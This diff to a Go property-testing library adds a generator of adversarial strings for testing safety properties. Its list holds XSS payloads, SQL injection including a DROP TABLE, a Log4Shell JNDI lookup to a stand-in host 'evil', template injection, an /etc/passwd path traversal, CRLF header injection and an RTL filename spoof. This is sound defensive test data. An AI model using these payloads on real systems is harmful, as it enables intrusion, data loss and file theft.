@@ -415,6 +415,35 @@ func SampledFrom[S ~[]E, E any](slice S) *Generator[E] {
 	return rapid.SampledFrom(slice)
 }
 
+// AdversarialStrings draws the hostile half of the string space: script
+// fragments, injection punctuation, control characters, and path escapes,
+// blended with arbitrary strings so a safety law also sees the benign
+// domain it must not break.
+//
+// One shipped derivation rather than a per-generator literal list, because
+// a safety claim probed with different attacks in different generated files
+// is several claims wearing one name.
+func AdversarialStrings() *Generator[string] {
+	return OneOf(
+		SampledFrom([]string{
+			"<script>alert(1)</script>",
+			`<img src=x onerror="alert(1)">`,
+			"<svg/onload=alert(1)>",
+			"<iframe src=javascript:alert(1)>",
+			`"';--`,
+			"' OR '1'='1",
+			"`; DROP TABLE users; --",
+			"${jndi:ldap://evil/a}",
+			"{{7*7}}",
+			"../../etc/passwd",
+			"key\x00null",
+			"line\r\nSet-Cookie: x=1",
+			"\u202eexe.gpj", // an RTL override, spelled escaped so the source itself stays honest
+		}),
+		String(),
+	)
+}
+
 // ─── User-defined types ─────────────────────────────────────────
 
 // Make creates a generator that produces values of type V via
